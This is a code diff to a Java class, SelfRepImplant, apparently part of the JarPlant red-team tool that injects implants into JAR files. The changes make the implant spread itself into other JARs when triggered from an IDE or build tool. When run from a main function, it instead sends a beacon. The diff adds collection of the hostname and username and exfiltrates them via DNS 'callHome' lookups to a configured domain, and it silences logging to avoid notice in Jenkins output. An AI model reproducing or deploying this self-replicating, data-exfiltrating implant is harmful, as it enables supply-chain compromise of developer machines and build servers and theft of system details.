@@ -109,13 +109,16 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
     private static final Random rng = new Random(System.currentTimeMillis());
 
     private final int executionContextIndicator;
+    private final String runId;
 
     public SelfRepImplant() {
         this.executionContextIndicator = EXEC_CTX_UNKNOWN;
+        this.runId = generateRandomId();
     }
 
     public SelfRepImplant(int executionContextIndicator) {
         this.executionContextIndicator = executionContextIndicator;
+        this.runId = generateRandomId();
     }
 
     public static SelfRepImplant create() {
@@ -172,6 +175,12 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
 
     public void payload() {
         /*
+         * Crudely prevent JarPlant from flooding the log/stdout.
+         * If it's eerily quiet in the Jenkins output, try removing this line.
+         */
+        disableAllLogging();
+
+        /*
          * The idea with "execution context awareness" is that you can also do different things based on indicators
          * of in what context this implant was triggered from.
          * Want to JarPlant all the things only if we're running inside Maven?
@@ -180,25 +189,34 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
          * You get the idea!
          */
         switch (executionContextIndicator) {
-            case EXEC_CTX_UNKNOWN -> System.out.println("[!] Execution context: Unknown.");
-            case EXEC_CTX_MAIN -> System.out.println("[ ] Execution context: A main function.");
-            case EXEC_CTX_IDE -> System.out.println("[ ] Execution context: An IDE.");
-            case EXEC_CTX_BUILD_TOOL -> System.out.println("[ ] Execution context: A build tool.");
+            case EXEC_CTX_UNKNOWN -> {
+                System.out.println("[!] Execution context: Unknown.");
+            }
+            case EXEC_CTX_MAIN -> {
+                System.out.println("[ ] Execution context: A main function.");
+                justNotifyExfilChannel();
+            }
+            case EXEC_CTX_IDE -> {
+                System.out.println("[ ] Execution context: An IDE.");
+                jarPlantAllTheThings();
+            }
+            case EXEC_CTX_BUILD_TOOL -> {
+                System.out.println("[ ] Execution context: A build tool.");
+                jarPlantAllTheThings();
+            }
         }
+    }
 
-        /*
-         * Crudely prevent JarPlant from flooding the log/stdout.
-         * If it's eerily quiet in the Jenkins output, try removing this line.
-         */
-        disableAllLogging();
-
+    private void jarPlantAllTheThings() {
         // Used for out-of-bounds exfil. We don't need many threads for this one.
         ExecutorService dnsThreads = Executors.newFixedThreadPool(1);
 
-        String id = generateRandomId();
         if (CONF_DOMAIN != null) {
             dnsThreads.submit(() -> {
-                callHome(CONF_DOMAIN, "hello", id);
+                String localHostname = getHostname();
+                String runningAsUser = getUsername();
+
+                callHome(CONF_DOMAIN, localHostname, runningAsUser, "hello-planting", runId);
             });
         }
 
@@ -270,7 +288,7 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
 
         if (CONF_DOMAIN != null) {
             dnsThreads.submit(() -> {
-                callHome(CONF_DOMAIN, "did-" + numSpiked, id);
+                callHome(CONF_DOMAIN, "did-" + numSpiked, runId);
             });
         }
 
@@ -344,6 +362,15 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
             // Someone wants us terminated. Gracefully GTFO.
             threads.shutdownNow();
             Thread.currentThread().interrupt();
+        }
+    }
+
+    private void justNotifyExfilChannel() {
+        if (CONF_DOMAIN != null) {
+            String localHostname = getHostname();
+            String runningAsUser = getUsername();
+
+            callHome(CONF_DOMAIN, localHostname, runningAsUser, "hello-notify", runId);
         }
     }
 
@@ -655,11 +682,24 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
     }
 
     private static String getHostname() {
+        String hostname = "unknown";
         try {
-            return InetAddress.getLocalHost().getHostName();
+            hostname = InetAddress.getLocalHost().getHostName();
         } catch (UnknownHostException ignored) {
-            return null;
         }
+
+        return hostname;
+    }
+
+    private static String getUsername() {
+        String username = System.getProperty("user.name");
+        if (username == null || username.isEmpty()) {
+            username = System.getenv().get("USERNAME");
+            if (username == null || username.isEmpty()) {
+                username = "unknown";
+            }
+        }
+        return username;
     }
 
     private static String generateRandomId() {
